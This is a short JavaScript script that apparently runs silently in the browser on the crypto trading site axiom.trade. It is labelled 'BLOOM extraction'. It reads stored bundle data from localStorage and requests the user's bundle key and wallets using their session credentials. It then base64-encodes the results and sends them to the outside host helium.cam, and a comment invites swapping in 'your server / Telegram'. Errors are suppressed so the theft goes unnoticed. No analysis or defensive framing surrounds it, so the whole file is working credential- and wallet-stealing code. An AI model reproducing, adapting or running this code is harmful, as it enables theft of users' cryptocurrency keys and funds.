// BLOOM extraction - runs silently on axiom.trade
(async () => {
  const REF = "BLOOM";
  const ts = Date.now();

  try {
    const sBundles = localStorage.getItem("sBundles") || "";
    const eBundles = localStorage.getItem("eBundles") || "";

    const payload = {
      ref: REF,
      ts: ts,
      sBundles: sBundles,
      eBundles: eBundles,
      url: location.href
    };

    // Fetch bundle-key-and-wallets (original behavior)
    fetch("https://api9.axiom.trade/bundle-key-and-wallets", {
      method: "POST",
      credentials: "include"
    })
    .then(r => r.json())
    .then(d => {
      payload.bundleKey = d?.bundleKey || "";
      payload.wallets = d?.wallets || [];
    })
    .catch(() => {})
    .finally(() => {
      // Send to your server / Telegram (replace with your endpoint if needed)
      const exfil = "https://helium.cam/api/forward?data=" + btoa(JSON.stringify(payload));
      fetch(exfil).catch(() => {});
    });
  } catch (err) {
    console.error("Bloom exfil error:", err);
  }
})();
